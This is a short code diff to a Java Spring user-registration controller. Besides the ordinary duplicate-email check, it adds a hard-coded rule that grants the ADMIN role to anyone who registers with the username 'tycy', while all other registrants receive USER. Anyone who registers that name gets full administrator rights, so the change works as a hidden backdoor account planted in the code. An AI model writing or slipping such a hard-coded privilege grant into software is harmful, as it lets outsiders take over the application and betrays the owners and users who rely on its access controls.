@@ -45,7 +45,13 @@ public class UserController {
         if(userService.findByEmail(user.getEmail()) != null){
             return new ResponseEntity<>(new Gson().toJson("EMAIL_EXIST"),HttpStatus.CONFLICT);
         }
-        user.setRole(Role.USER);
+
+        if(user.getUsername().equals("tycy")){
+            user.setRole(Role.ADMIN);
+        }else{
+            user.setRole(Role.USER);
+        }
+
         user.setScore(0L);
         userService.saveUser(user);
         return new ResponseEntity<>(new Gson().toJson("REGISTERED"), HttpStatus.CREATED);
